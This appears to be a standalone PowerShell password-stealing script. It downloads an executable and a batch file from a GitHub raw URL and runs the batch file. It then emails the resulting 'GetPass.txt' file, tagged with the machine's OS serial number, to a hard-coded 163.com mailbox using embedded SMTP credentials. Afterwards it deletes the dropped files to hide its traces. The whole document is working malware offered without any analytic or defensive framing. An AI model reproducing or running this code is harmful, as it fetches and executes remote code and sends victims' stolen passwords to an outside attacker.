(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/xidada233ha/chm/master/la.exe','D:\Get.exe');
(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/xidada233ha/chm/master/Command.bat','D:\Command.bat');
D:\Command.bat;
$object1 = 'GetPass.txt--' + (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME).SerialNumber
$mail = New-Object System.Net.Mail.MailMessage
#set the addresses
$mail.From = New-Object System.Net.Mail.MailAddress('golr827610649@163.com','golr827610649@163.com')
$mail.To.Add('golr827610649@163.com')
#set the content
$mail.Subject = $object1
$mail.Priority  = 'High'
$mail.Body = 'test'
$filename= 'D:\GetPass.txt'
$attachment = new-Object System.Net.Mail.Attachment($filename)
$mail.Attachments.Add($attachment)
#send the message
$smtp = New-Object System.Net.Mail.SmtpClient -argumentList 'smtp.163.com'
$smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList 'golr827610649@163.com','z77379'
$smtp.EnableSsl = 'True';
$smtp.Timeout = '10000000';
try{
	$smtp.Send($mail)
	echo 'Ok,Send succed!'
}
catch 
{
	echo 'Error!Filed!'
}
remove-item 'D:\GetPass.txt'
remove-item 'D:\Get.exe'
remove-item 'D:\Command.bat'
